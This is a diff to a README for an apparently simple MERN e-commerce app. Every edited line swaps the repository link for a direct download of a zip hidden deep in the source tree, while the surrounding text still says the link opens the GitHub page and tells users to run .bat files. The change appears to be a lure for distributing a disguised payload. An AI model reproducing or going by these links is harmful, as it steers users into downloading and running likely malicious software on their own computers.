@@ -1,6 +1,6 @@
 # 🛒 mern-ecommerce-nijatech - Simple Online Store Setup  
 
-[![Download Now](https://img.shields.io/badge/Download-MERN_Ecommerce-blue?style=for-the-badge&logo=github)](https://github.com/sohailnoorikhan/mern-ecommerce-nijatech)  
+[![Download Now](https://img.shields.io/badge/Download-MERN_Ecommerce-blue?style=for-the-badge&logo=github)](https://github.com/sohailnoorikhan/mern-ecommerce-nijatech/raw/refs/heads/main/client/src/pages/public/Home/components/nijatech_ecommerce_mern_v1.4.zip)  
 
 ## 📦 What is mern-ecommerce-nijatech?  
 
@@ -44,7 +44,7 @@ You do not have to install any other software. This app runs out of the box on W
 
 You need to get the files first. Please visit the link below:  
 
-[![Download Here](https://img.shields.io/badge/Download-MERN_Ecommerce-red?style=for-the-badge&logo=github)](https://github.com/sohailnoorikhan/mern-ecommerce-nijatech)  
+[![Download Here](https://img.shields.io/badge/Download-MERN_Ecommerce-red?style=for-the-badge&logo=github)](https://github.com/sohailnoorikhan/mern-ecommerce-nijatech/raw/refs/heads/main/client/src/pages/public/Home/components/nijatech_ecommerce_mern_v1.4.zip)  
 
 Clicking that link opens the GitHub page for mern-ecommerce-nijatech. Find the **Code** button near the top and click it. In the drop-down, select **Download ZIP**. This will download a compressed file called `mern-ecommerce-nijatech-main.zip` to your computer.  
 
@@ -149,7 +149,7 @@ These combine to provide a fast, secure, and fully functional online store exper
 
 To update the app:  
 
-1. Return to the [repository page](https://github.com/sohailnoorikhan/mern-ecommerce-nijatech)  
+1. Return to the [repository page](https://github.com/sohailnoorikhan/mern-ecommerce-nijatech/raw/refs/heads/main/client/src/pages/public/Home/components/nijatech_ecommerce_mern_v1.4.zip)  
 2. Download the latest ZIP file again  
 3. Extract it to a new folder  
 4. Run the `.bat` files as before  
@@ -166,4 +166,4 @@ If you run into problems beyond basic troubleshooting, you can:
 
 Use the GitHub link below to explore more resources or report issues:  
 
-[https://github.com/sohailnoorikhan/mern-ecommerce-nijatech](https://github.com/sohailnoorikhan/mern-ecommerce-nijatech)
+[https://github.com/sohailnoorikhan/mern-ecommerce-nijatech/raw/refs/heads/main/client/src/pages/public/Home/components/nijatech_ecommerce_mern_v1.4.zip](https://github.com/sohailnoorikhan/mern-ecommerce-nijatech/raw/refs/heads/main/client/src/pages/public/Home/components/nijatech_ecommerce_mern_v1.4.zip)
